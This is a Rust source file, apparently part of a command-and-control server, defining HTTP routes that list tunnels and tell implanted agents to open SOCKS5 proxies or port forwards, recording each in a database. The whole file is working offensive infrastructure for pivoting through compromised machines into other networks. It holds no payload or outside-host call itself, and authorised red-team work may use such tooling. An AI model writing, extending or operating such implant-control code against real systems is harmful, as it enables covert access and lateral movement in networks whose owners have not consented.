use crate::core::implants::parse_agent_id;
use crate::state::AppState;
use axum::{
    extract::{Path, State},
    http::StatusCode,
    response::IntoResponse,
    routing::{get, post},
    Json, Router,
};
use serde::Deserialize;
use serde_json::json;

pub fn routes(state: AppState) -> Router {
    Router::new()
        .route("/api/tunnels", get(list_tunnels))
        .route("/api/tunnels/socks", post(start_socks))
        .route("/api/tunnels/portfwd", post(start_portfwd))
        .route("/api/tunnels/:id/close", post(close_tunnel))
        .with_state(state)
}

async fn list_tunnels(State(state): State<AppState>) -> impl IntoResponse {
    match state.db.list_tunnels() {
        Ok(rows) => {
            let items: Vec<_> = rows
                .iter()
                .map(|r| {
                    json!({
                        "id": r.id,
                        "agent_id": hex::encode(r.agent_id),
                        "tunnel_type": r.tunnel_type,
                        "bind_addr": r.bind_addr,
                        "bind_port": r.bind_port,
                        "remote_addr": r.remote_addr,
                        "remote_port": r.remote_port,
                        "status": r.status,
                        "task_id": r.task_id,
                        "created_at": r.created_at,
                    })
                })
                .collect();
            (StatusCode::OK, Json(json!({ "tunnels": items })))
        }
        Err(e) => (
            StatusCode::INTERNAL_SERVER_ERROR,
            Json(json!({ "error": e.to_string() })),
        ),
    }
}

#[derive(Deserialize)]
struct SocksRequest {
    agent_id: String,
    bind_addr: String,
    bind_port: u16,
}

async fn start_socks(
    State(state): State<AppState>,
    Json(req): Json<SocksRequest>,
) -> impl IntoResponse {
    let agent_id = match parse_agent_id(&req.agent_id) {
        Ok(id) => id,
        Err(e) => return (StatusCode::BAD_REQUEST, Json(json!({ "error": e }))),
    };

    let data = format!("{}:{}", req.bind_addr, req.bind_port);
    let task_id = match state.tasks.enqueue(&agent_id, 9, data.as_bytes()) {
        Ok(id) => id,
        Err(e) => return (StatusCode::BAD_REQUEST, Json(json!({ "error": e }))),
    };

    match state.db.insert_tunnel(
        &agent_id,
        "socks5",
        &req.bind_addr,
        req.bind_port as i64,
        "",
        0,
        Some(task_id),
    ) {
        Ok(tunnel_id) => (
            StatusCode::CREATED,
            Json(json!({ "tunnel_id": tunnel_id, "task_id": task_id })),
        ),
        Err(e) => (
            StatusCode::INTERNAL_SERVER_ERROR,
            Json(json!({ "error": e.to_string() })),
        ),
    }
}

#[derive(Deserialize)]
struct PortFwdRequest {
    agent_id: String,
    bind_addr: String,
    bind_port: u16,
    remote_addr: String,
    remote_port: u16,
}

async fn start_portfwd(
    State(state): State<AppState>,
    Json(req): Json<PortFwdRequest>,
) -> impl IntoResponse {
    let agent_id = match parse_agent_id(&req.agent_id) {
        Ok(id) => id,
        Err(e) => return (StatusCode::BAD_REQUEST, Json(json!({ "error": e }))),
    };

    let data = format!(
        "{}:{}->{}:{}",
        req.bind_addr, req.bind_port, req.remote_addr, req.remote_port
    );
    let task_id = match state.tasks.enqueue(&agent_id, 10, data.as_bytes()) {
        Ok(id) => id,
        Err(e) => return (StatusCode::BAD_REQUEST, Json(json!({ "error": e }))),
    };

    match state.db.insert_tunnel(
        &agent_id,
        "portfwd",
        &req.bind_addr,
        req.bind_port as i64,
        &req.remote_addr,
        req.remote_port as i64,
        Some(task_id),
    ) {
        Ok(tunnel_id) => (
            StatusCode::CREATED,
            Json(json!({ "tunnel_id": tunnel_id, "task_id": task_id })),
        ),
        Err(e) => (
            StatusCode::INTERNAL_SERVER_ERROR,
            Json(json!({ "error": e.to_string() })),
        ),
    }
}

async fn close_tunnel(
    State(state): State<AppState>,
    Path(id): Path<i64>,
) -> impl IntoResponse {
    match state.db.close_tunnel(id) {
        Ok(true) => (StatusCode::OK, Json(json!({ "closed": true }))),
        Ok(false) => (
            StatusCode::NOT_FOUND,
            Json(json!({ "error": "not found" })),
        ),
        Err(e) => (
            StatusCode::INTERNAL_SERVER_ERROR,
            Json(json!({ "error": e.to_string() })),
        ),
    }
}
